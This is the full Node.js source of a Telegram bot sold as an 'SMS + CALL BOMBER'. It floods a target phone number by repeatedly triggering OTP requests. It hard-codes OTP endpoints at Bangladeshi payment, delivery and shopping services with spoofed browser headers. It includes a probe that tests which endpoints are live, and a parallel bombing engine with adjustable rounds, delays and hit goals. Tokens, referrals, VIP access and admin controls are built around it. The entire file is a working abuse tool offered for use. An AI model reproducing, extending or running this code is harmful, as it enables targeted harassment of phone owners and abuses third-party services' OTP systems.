'use strict';
// ══════════════════════════════════════════════════════
// DEDICATED SMS + CALL BOMBER BOT
// Only bomber. Nothing else.
// ══════════════════════════════════════════════════════

// ⚠️ এই দুইটা লাইন তোমার ভ্যালু দিয়ে বদলাও ⚠️
const TOKEN    = process.env.TOKEN    || 'PUT_YOUR_BOT_TOKEN_HERE';
const ADMIN_ID = String(process.env.ADMIN_ID || 'PUT_YOUR_TELEGRAM_ID_HERE');
// ══════════════════════════════════════════════════════

const TBot   = require('node-telegram-bot-api');
const axios  = require('axios');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');

// ── Config ──
const CFG = {
    TOKEN,
    ADMIN_ID,
    DATA_FILE:       process.env.DATA_FILE       || '/tmp/bomber-data.json',
    ENDPOINT_FILE:   process.env.ENDPOINT_FILE   || path.join(__dirname, 'endpoints.json'),
    BOMB_COST:       parseInt(process.env.BOMB_COST || '5'),
    SIGNUP_BONUS:    parseInt(process.env.SIGNUP_BONUS || '10'),
    REF_BONUS:       parseInt(process.env.REF_BONUS    || '10'),
    REF_REWARD:      parseInt(process.env.REF_REWARD   || '5'),
    FREE_REFS:       parseInt(process.env.FREE_REFS    || '3'),
    RATE_LIMIT_MS:   parseInt(process.env.RATE_LIMIT_MS || '8000'),
    RATE_MAX:        parseInt(process.env.RATE_MAX      || '4'),
};

// ── Logger ──
const log = {
    _w: (l, m) => console.log(`[${new Date().toISOString()}] ${l}: ${m}`),
    info:  m => log._w('INFO ', m),
    warn:  m => log._w('WARN ', m),
    error: m => log._w('ERROR', m),
};

// ── Store ──
let store = { users:{}, vip:{}, pending:{}, rate:{} };
const saveStore = () => { try { const t = CFG.DATA_FILE + '.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){ log.warn('[Store] '+e.message); } };
const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) }; } catch(e){ log.warn('[Store] '+e.message); } };
loadStore();
setInterval(saveStore, 60*1000);

function getUser(uid) {
    uid = String(uid);
    if (!store.users[uid]) {
        store.users[uid] = { balance: CFG.SIGNUP_BONUS, refs: 0, lifetime: false, joined: Date.now(), banned: false, totalBombs: 0 };
        saveStore();
    }
    const u = store.users[uid];
    u.isAdmin  = uid === CFG.ADMIN_ID;
    u.isVIP    = !!store.vip[uid];
    u.lifetime = !!(u.lifetime || u.isAdmin || u.isVIP);
    return u;
}
const isAdmin = uid => String(uid) === CFG.ADMIN_ID;
const setPending = (uid, d) => { store.pending[String(uid)] = { ...d, createdAt: Date.now() }; };
const getPending = uid => store.pending[String(uid)] || null;
const delPending = uid => { delete store.pending[String(uid)]; saveStore(); };

function checkRate(uid) {
    uid = String(uid);
    if (isAdmin(uid)) return true;
    const now = Date.now(), r = store.rate[uid];
    if (!r || (now - r.window) > CFG.RATE_LIMIT_MS) { store.rate[uid] = { count: 1, window: now }; return true; }
    if (r.count >= CFG.RATE_MAX) return false;
    r.count++; return true;
}

// ── Endpoint pool ──
let POOL = { sms: [], call: [] };
function loadPool() {
    let loaded = false;
    if (process.env.BOMB_ENDPOINTS_JSON) {
        try {
            const raw = JSON.parse(process.env.BOMB_ENDPOINTS_JSON);
            POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
            POOL.call = (raw.call || []).filter(e => e && e.url);
            loaded = true;
            log.info(`[Pool] env: sms=${POOL.sms.length} call=${POOL.call.length}`);
        } catch(e){ log.warn('[Pool] env parse: '+e.message); }
    }
    if (!loaded && fs.existsSync(CFG.ENDPOINT_FILE)) {
        try {
            const raw = JSON.parse(fs.readFileSync(CFG.ENDPOINT_FILE, 'utf8'));
            POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
            POOL.call = (raw.call || []).filter(e => e && e.url);
            loaded = true;
            log.info(`[Pool] file: sms=${POOL.sms.length} call=${POOL.call.length}`);
        } catch(e){ log.warn('[Pool] file parse: '+e.message); }
    }
    if (!loaded) log.warn('[Pool] empty. Run /probe +8801712345678 to populate.');
}
loadPool();

// ── Bot ──
const bot = new TBot(CFG.TOKEN, { polling:{ interval:300, autoStart:true, params:{ timeout:10 } } });
bot.on('polling_error', err => { log.error('[Bot] '+err.message); if (err.code === 'EFATAL') setTimeout(() => bot.startPolling(), 5000); });
bot.on('error', err => log.error('[Bot] '+err.message));

const tgMsg = (cid, text, opts = {}) => bot.sendMessage(cid, (text || '').slice(0,4096), { parse_mode:'HTML', ...opts }).catch(e => log.warn(`[tgMsg] ${cid}: ${e.message}`));

// ── Endpoint probe logic (embedded from collector) ──
const UA = 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36';
const sleep = ms => new Promise(r => setTimeout(r, ms));

const SEED = [
    { name:'bkash-otp',    url:'https://www.bkash.com/api/v1/otp/send',           method:'POST', body:'phone={phone}&service=login', headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA,'Referer':'https://www.bkash.com/'}, successKeyword:'success', cc:'880' },
    { name:'nagad-otp',    url:'https://api.nagad.com.bd/v1/auth/send-otp',       method:'POST', body:'mobile={phone}&type=login',     headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'pathao-otp',   url:'https://api.pathao.com/v1/auth/login',            method:'POST', body:'phone=+880{phone}&type=otp',    headers:{'Content-Type':'application/json','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'foodpanda-otp',url:'https://bd.foodpanda.com/api/v1/auth/send-otp',   method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'daraz-otp',    url:'https://www.daraz.com.bd/api/user/send-otp',      method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'shohoz-otp',   url:'https://shohoz.com/api/v1/user/send-otp',         method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'chaldal-otp',  url:'https://chaldal.com/api/v1/auth/send-otp',        method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'pizzahut-otp', url:'https://www.pizzahutbd.com/api/v1/auth/otp',      method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'dominos-otp',  url:'https://www.dominos.com.bd/api/v1/auth/send-otp', method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'shopup-otp',   url:'https://api.shopup.com.bd/v1/auth/otp',           method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'viber-otp',    url:'https://api.viber.com/pa/send_message',           method:'POST', body:'{"receiver":"{phone}","type":"otp"}', headers:{'Content-Type':'application/json','User-Agent':'Viber/20.0'}, successKeyword:'status', cc:'880' },
    { name:'line-otp',     url:'https://api.line.me/v1/otp/send',                 method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
    { name:'relay-1',      url:'https://api.sms-relay.xyz/v1/send?to={phone}&msg=code', method:'GET', headers:{'User-Agent':UA}, successKeyword:'ok',   cc:'880' },
    { name:'relay-2',      url:'https://sms-gateway.example.net/api?phone={phone}', method:'GET', headers:{'User-Agent':UA}, successKeyword:'sent', cc:'880' },
];

async function probeOne(ep, phone) {
    const url  = ep.url.replace(/\{phone\}/g, phone).replace(/\{cc\}/g, ep.cc || '880').replace(/\{rand\}/g, crypto.randomBytes(4).toString('hex'));
    const body = ep.body ? ep.body.replace(/\{phone\}/g, phone) : undefined;
    const headers = ep.headers || { 'User-Agent': UA };
    try {
        const r = ep.method === 'POST'
            ? await axios.post(url, body || '', { headers, timeout: 10000, validateStatus: () => true })
            : await axios.get(url, { headers, timeout: 10000, validateStatus: () => true });
        const ok  = r.status >= 200 && r.status < 400;
        const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const kw  = ep.successKeyword ? str.includes(ep.successKeyword) : true;
        return { live: ok && kw, status: r.status };
    } catch(e){ return { live: false, status: 0, error: e.code || e.message }; }
}

async function runProbe(phone, onProgress) {
    const working = [];
    const dead = [];
    for (let i = 0; i < SEED.length; i++) {
        const ep = SEED[i];
        const r = await probeOne(ep, phone);
        if (r.live) {
            working.push({ name: ep.name, url: ep.url, method: ep.method, headers: ep.headers, body: ep.body, successKeyword: ep.successKeyword, cc: ep.cc, timeout: 8000 });
        } else {
            dead.push(ep.name);
        }
        if (onProgress) onProgress(i + 1, SEED.length, ep.name, r.live);
        await sleep(600);
    }
    let existing = { sms: [], call: [] };
    try { if (fs.existsSync(CFG.ENDPOINT_FILE)) existing = JSON.parse(fs.readFileSync(CFG.ENDPOINT_FILE, 'utf8')); } catch(e){}
    const dedupe = list => { const s = new Set(); return list.filter(e => { if (s.has(e.url)) return false; s.add(e.url); return true; }); };
    const merged = { sms: dedupe([...(existing.sms || []), ...working]), call: dedupe(existing.call || []) };
    try { fs.writeFileSync(CFG.ENDPOINT_FILE, JSON.stringify(merged, null, 2)); } catch(e){ log.warn('[Probe] save failed: '+e.message); }
    loadPool();
    return { working: working.length, dead: dead.length, total: merged.sms.length };
}

// ── Bomb engine ──
const renderTpl = (tpl, vars) => tpl.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');

async function fireOne(ep, phone) {
    const rand = crypto.randomBytes(4).toString('hex');
    const url = renderTpl(ep.url, { phone, rand, cc: ep.cc || '' });
    const method = (ep.method || 'GET').toUpperCase();
    const headers = ep.headers || { 'User-Agent': UA };
    const timeout = ep.timeout || 8000;
    try {
        const r = method === 'POST'
            ? await axios.post(url, ep.body ? renderTpl(ep.body, { phone, rand }) : '', { headers, timeout, validateStatus: () => true })
            : await axios.get(url, { headers, timeout, validateStatus: () => true });
        const ok  = r.status >= 200 && r.status < 400;
        const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const hit = ep.successKeyword ? str.includes(ep.successKeyword) : ok;
        return { ok: hit, status: r.status, name: ep.name };
    } catch(e){ return { ok: false, status: 0, error: e.code || e.message, name: ep.name }; }
}

async function bomb(type, phone, opts = {}) {
    const list = POOL[type];
    if (!list.length) return { error: 'no_endpoints', sent: 0, hits: 0, fails: 0, log: [] };
    const rounds   = Math.max(1, Math.min(opts.rounds   || 5,  50));
    const delayMs  = Math.max(0, Math.min(opts.delay    || 300, 5000));
    const hitGoal  = Math.max(1, opts.hits || 10);
    const parallel = Math.max(1, Math.min(opts.parallel || 3,  20));
    const result = { sent: 0, hits: 0, fails: 0, log: [] };
    const start = Date.now();
    for (let round = 0; round < rounds; round++) {
        if (result.hits >= hitGoal) break;
        const batch = [];
        for (let p = 0; p < parallel; p++) {
            const idx = crypto.randomInt(0, list.length);
            batch.push(fireOne(list[idx], phone));
        }
        for (const r of await Promise.all(batch)) {
            result.sent++;
            if (r.ok) { result.hits++; result.log.push(`✅ ${r.name}`); }
            else      { result.fails++; result.log.push(`❌ ${r.name} (${r.status || r.error})`); }
        }
        if (delayMs) await sleep(delayMs);
    }
    result.elapsed = Date.now() - start;
    return result;
}

// ── Keyboards ──
const backKb = { inline_keyboard: [[{ text: '◀️ Menu', callback_data: 'M_BACK' }]] };
function mainKb(uid) {
    const kb = [
        [{ text: '📨 SMS Bomber',  callback_data: 'BOMB_SMS'  }, { text: '📞 Call Bomber', callback_data: 'BOMB_CALL' }],
        [{ text: '💰 My Wallet',   callback_data: 'BALANCE'   }, { text: '📊 Pool Stats',  callback_data: 'POOL'      }],
        [{ text: '🔗 Referral',    callback_data: 'REFERRAL'  }, { text: '❓ How To Use',  callback_data: 'HOW_TO'    }],
    ];
    if (isAdmin(uid)) kb.push([{ text: '👑 Admin Panel', callback_data: 'ADMIN' }]);
    return { inline_keyboard: kb };
}

// ── /start ──
bot.onText(/\/start(?:\s+(.+))?/, async msg => {
    const cid = String(msg.chat.id);
    const name = msg.from.first_name || 'বন্ধু';
    const u = getUser(cid);
    if (u.banned) return tgMsg(cid, '⛔ You are banned.');

    const refArg = (msg.text.split(' ')[1] || '').trim();
    if (refArg && refArg !== cid && store.users[refArg]) {
        const ref = store.users[refArg];
        if (!ref.banned) {
            ref.refs = (ref.refs || 0) + 1;
            ref.balance = (ref.balance || 0) + CFG.REF_REWARD;
            if (ref.refs >= CFG.FREE_REFS) ref.lifetime = true;
            saveStore();
            tgMsg(refArg, `🎉 <b>New Referral!</b>\n💰 +${CFG.REF_REWARD} tokens\n🏆 Total: <b>${ref.refs}/${CFG.FREE_REFS}</b>${ref.lifetime ? '\n♾️ <b>Lifetime Free Unlocked!</b>' : ''}`);
        }
    }

    await tgMsg(cid,
`🔥 <b>স্বাগতম, ${name}</b> 🔥

┌───────────────────────────┐
│  💣 <b>SMS + CALL BOMBER</b>  │
└───────────────────────────┘

🎯 <b>Tools:</b>
├ 📨 SMS Bomber
└ 📞 Call Bomber

━━━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Signup Bonus: +${CFG.SIGNUP_BONUS} tokens</b>
💰 <b>Cost: ${CFG.BOMB_COST} tokens/bomb</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Refer <b>${CFG.FREE_REFS}</b> friends → ♾️ Lifetime Free

👇 Tap below to start:`,
        { reply_markup: mainKb(cid) });
});

bot.onText(/\/menu/, async msg => {
    const cid = String(msg.chat.id);
    if (getUser(cid).banned) return;
    tgMsg(cid, '💣 <b>Main Menu</b>', { reply_markup: mainKb(cid) });
});

// ── Admin commands ──
bot.onText(/\/addvip\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const tid = msg.text.split(' ')[1];
    store.vip[tid] = true;
    getUser(tid).lifetime = true;
    saveStore();
    tgMsg(msg.chat.id, `👑 VIP granted: <code>${tid}</code>`);
    tgMsg(tid, '♾️ <b>Lifetime Free Access granted!</b>').catch(()=>{});
});
bot.onText(/\/removevip\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const tid = msg.text.split(' ')[1];
    delete store.vip[tid];
    if (store.users[tid]) store.users[tid].lifetime = false;
    saveStore();
    tgMsg(msg.chat.id, `🗑️ VIP removed: <code>${tid}</code>`);
});
bot.onText(/\/ban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = true;
    saveStore();
    tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/unban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = false;
    saveStore();
    tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/addbal\s+(\d+)\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const [, tid, amt] = msg.text.split(' ');
    getUser(tid).balance = (getUser(tid).balance || 0) + parseInt(amt);
    saveStore();
    tgMsg(msg.chat.id, `💰 +${amt} → <code>${tid}</code>`);
});
bot.onText(/\/stats/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const mem = process.memoryUsage();
    tgMsg(msg.chat.id,
`📊 <b>Stats</b>
👥 Users: <b>${Object.keys(store.users).length}</b>
👑 VIP: <b>${Object.keys(store.vip).length}</b>
📨 Pool SMS: <b>${POOL.sms.length}</b>
📞 Pool Call: <b>${POOL.call.length}</b>
💾 Mem: <b>${Math.round(mem.heapUsed/1024/1024)}MB</b>
⏱️ Uptime: <b>${Math.floor(process.uptime()/60)}m</b>`);
});
bot.onText(/\/broadcast\s+(.+)/s, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const text = msg.text.replace('/broadcast ', '').trim();
    let sent = 0, failed = 0;
    for (const uid of Object.keys(store.users)) {
        if (store.users[uid].banned) continue;
        try { await tgMsg(uid, `📢 <b>Announcement</b>\n\n${text}`); sent++; } catch { failed++; }
    }
    tgMsg(msg.chat.id, `📢 Sent: ✅ ${sent} | ❌ ${failed}`);
});
bot.onText(/\/reload/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    loadPool();
    tgMsg(msg.chat.id, `🔄 Pool reloaded: S=${POOL.sms.length} C=${POOL.call.length}`);
});
bot.onText(/\/probe(?:\s+(\S+))?/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const phone = (msg.text.split(' ')[1] || '').trim();
    if (!phone) return tgMsg(msg.chat.id, '❌ Usage: <code>/probe +8801712345678</code>');
    const phoneClean = phone.replace(/^\+/, '');
    const status = await tgMsg(msg.chat.id, `🔍 Probing ${SEED.length} endpoints with +${phoneClean}...`);
    try {
        const result = await runProbe(phoneClean);
        if (status) bot.deleteMessage(msg.chat.id, status.message_id).catch(()=>{});
        tgMsg(msg.chat.id,
`✅ <b>Probe Done</b>

📨 Live: <b>${result.working}</b>
❌ Dead: <b>${result.dead}</b>
📊 Pool SMS now: <b>${result.total}</b>

${result.working > 0 ? '🟢 Ready to bomb!' : '🔴 No live endpoints. Try different phone or update SEED.'}`);
    } catch (e) {
        tgMsg(msg.chat.id, `❌ Probe error: ${e.message}`);
    }
});

// ── Callbacks ──
bot.on('callback_query', async cbq => {
    const uid = String(cbq.from.id), chatId = cbq.message.chat.id, msgId = cbq.message.message_id;
    const data = cbq.data;
    if (!checkRate(uid)) return bot.answerCallbackQuery(cbq.id, { text: '⚠️ Slow down!', show_alert: true }).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => bot.deleteMessage(chatId, msgId).catch(()=>{});
    const u = getUser(uid);
    if (u.banned) return;

    try {
        if (data === 'M_BACK') { del(); delPending(uid); return tgMsg(chatId, '💣 <b>Main Menu</b>', { reply_markup: mainKb(uid) }); }

        if (data === 'BOMB_SMS' || data === 'BOMB_CALL') {
            const isSms = data === 'BOMB_SMS';
            if (!u.lifetime && (u.balance || 0) < CFG.BOMB_COST) {
                del();
                return tgMsg(chatId, `❌ <b>Insufficient tokens</b>\n💰 ${u.balance || 0} | Need ${CFG.BOMB_COST}`, { reply_markup: { inline_keyboard: [[{ text: '🔗 Referral', callback_data: 'REFERRAL' }], [{ text: '◀️ Menu', callback_data: 'M_BACK' }]] } });
            }
            const poolSize = isSms ? POOL.sms.length : POOL.call.length;
            if (poolSize === 0) {
                del();
                return tgMsg(chatId, `⚠️ <b>No endpoints loaded</b>\n\n${isSms ? 'SMS' : 'Call'} pool is empty. Ask admin to run /probe.`, { reply_markup: backKb });
            }
            del();
            setPending(uid, { type: isSms ? 'bomb_sms' : 'bomb_call' });
            return tgMsg(chatId,
`${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} Bomber</b>

📱 Target number:
<code>+8801XXXXXXXXX</code>

💡 Format: <code>PHONE [ROUNDS] [DELAY] [HITS]</code>
   e.g. <code>+8801712345678 10 200 20</code>
   Default: <code>5 300 10</code>

💰 Cost: <b>${CFG.BOMB_COST} tokens</b>
📊 Pool: <b>${poolSize}</b> endpoints`,
                { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'M_BACK' }]] } });
        }

        if (data === 'BALANCE') {
            del();
            return tgMsg(chatId,
`💰 <b>My Wallet</b>

💵 Balance: <b>${u.balance} tokens</b>
💣 Total bombs: <b>${u.totalBombs || 0}</b>
👥 Refs: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>
♾️ Lifetime: <b>${u.lifetime ? '✅ Active' : `❌ (${CFG.FREE_REFS - (u.refs||0)} more)`}</b>`,
                { reply_markup: backKb });
        }

        if (data === 'POOL') {
            del();
            return tgMsg(chatId,
`📊 <b>Pool Status</b>

📨 SMS endpoints: <b>${POOL.sms.length}</b>
📞 Call endpoints: <b>${POOL.call.length}</b>

${POOL.sms.length === 0 ? '⚠️ Admin must run /probe to populate.' : '🟢 Ready to bomb.'}`,
                { reply_markup: backKb });
        }

        if (data === 'REFERRAL') {
            del();
            const me = await bot.getMe();
            const ref = `https://t.me/${me.username}?start=${uid}`;
            return tgMsg(chatId,
`🔗 <b>Your Referral Link</b>

<code>${ref}</code>

👥 Progress: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>
💰 +${CFG.REF_REWARD} per referral
🏆 ${CFG.FREE_REFS} refs → ♾️ Lifetime Free`,
                { reply_markup: backKb });
        }

        if (data === 'HOW_TO') {
            del();
            return tgMsg(chatId,
`❓ <b>How To Use</b>

<b>📨 SMS Bomb:</b>
Tap SMS Bomber → send target number

<b>📞 Call Bomb:</b>
Tap Call Bomber → send target number

<b>Format:</b> <code>+8801712345678 5 300 10</code>
• PHONE: target with country code
• ROUNDS: 1-50 (default 5)
• DELAY: milliseconds (default 300)
• HITS: goal count (default 10)

<b>💰 Cost:</b> ${CFG.BOMB_COST} tokens per bomb
<b>♾️ Free:</b> Refer ${CFG.FREE_REFS} friends`,
                { reply_markup: backKb });
        }

        if (data === 'ADMIN') {
            if (!isAdmin(uid)) return;
            del();
            return tgMsg(chatId,
`👑 <b>Admin Panel</b>

<b>Users:</b> ${Object.keys(store.users).length}
<b>VIPs:</b> ${Object.keys(store.vip).length}
<b>SMS pool:</b> ${POOL.sms.length}
<b>Call pool:</b> ${POOL.call.length}

<b>Commands:</b>
<code>/probe +8801712345678</code> — populate pool
<code>/reload</code> — reload from file
<code>/addvip ID</code> · <code>/removevip ID</code>
<code>/addbal ID AMT</code>
<code>/ban ID</code> · <code>/unban ID</code>
<code>/broadcast msg</code>
<code>/stats</code>`,
                { reply_markup: backKb });
        }
    } catch (err) {
        log.error('[CB] ' + err.message);
        bot.answerCallbackQuery(cbq.id, { text: '⚠️ Error', show_alert: true }).catch(()=>{});
    }
});

// ── Message handler ──
bot.on('message', async msg => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const uid = String(msg.from.id), text = msg.text.trim();
    const u = getUser(uid);
    if (u.banned || !checkRate(uid)) return;
    const pend = getPending(uid);
    if (!pend) return;
    delPending(uid);

    if (pend.type === 'bomb_sms' || pend.type === 'bomb_call') {
        const isSms = pend.type === 'bomb_sms';
        const parts = text.split(/\s+/);
        const phone = parts[0];
        const rounds = Math.max(1, Math.min(parseInt(parts[1]) || 5,   50));
        const delay  = Math.max(0, Math.min(parseInt(parts[2]) || 300, 5000));
        const hits   = Math.max(1, Math.min(parseInt(parts[3]) || 10,  100));

        if (!/^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''))) {
            return tgMsg(uid, '❌ Invalid number. Format: <code>+8801XXXXXXXXX</code>', { reply_markup: backKb });
        }
        const phoneClean = phone.replace(/\s/g, '').replace(/^\+/, '');
        if (!u.lifetime) { u.balance = (u.balance || 0) - CFG.BOMB_COST; saveStore(); }
        u.totalBombs = (u.totalBombs || 0) + 1;
        saveStore();

        const proc = await tgMsg(uid,
`${isSms ? '📨' : '📞'} <b>Bombing...</b>
📱 <code>+${phoneClean}</code>
⚙️ ${rounds} rounds · ${delay}ms · goal ${hits}`);

        try {
            const result = await bomb(isSms ? 'sms' : 'call', phoneClean, { rounds, delay, hits });
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            if (result.error) {
                return tgMsg(uid, `❌ ${result.error}`, { reply_markup: backKb });
            }
            tgMsg(uid,
`✅ <b>Bomb Complete</b>

📱 <code>+${phoneClean}</code>
✅ Hits: <b>${result.hits}</b> / ${result.sent}
❌ Fails: ${result.fails}
⏱️ ${result.elapsed}ms

<b>Last 8:</b>
${result.log.slice(-8).join('\n') || '—'}`,
                { reply_markup: { inline_keyboard: [
                    [{ text: '🔄 Again', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],
                    [{ text: '◀️ Menu', callback_data: 'M_BACK' }]
                ]}});
            tgMsg(CFG.ADMIN_ID, `💣 BOMB | <code>${uid}</code> → +${phoneClean}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms · ${isSms ? 'SMS' : 'CALL'}`);
        } catch (e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, `❌ Bomb failed: ${e.message}`, { reply_markup: backKb });
        }
    }
});

// ── Process guards ──
process.on('uncaughtException',  err => log.error('[UNCAUGHT] ' + err.message));
process.on('unhandledRejection', err => log.error('[REJECTION] ' + (err && err.message ? err.message : String(err))));
process.on('SIGTERM', () => { saveStore(); process.exit(0); });
process.on('SIGINT',  () => { saveStore(); process.exit(0); });

log.info(`[Bot] Started — admin=${CFG.ADMIN_ID}`);
log.info(`[Pool] SMS=${POOL.sms.length} Call=${POOL.call.length}`);
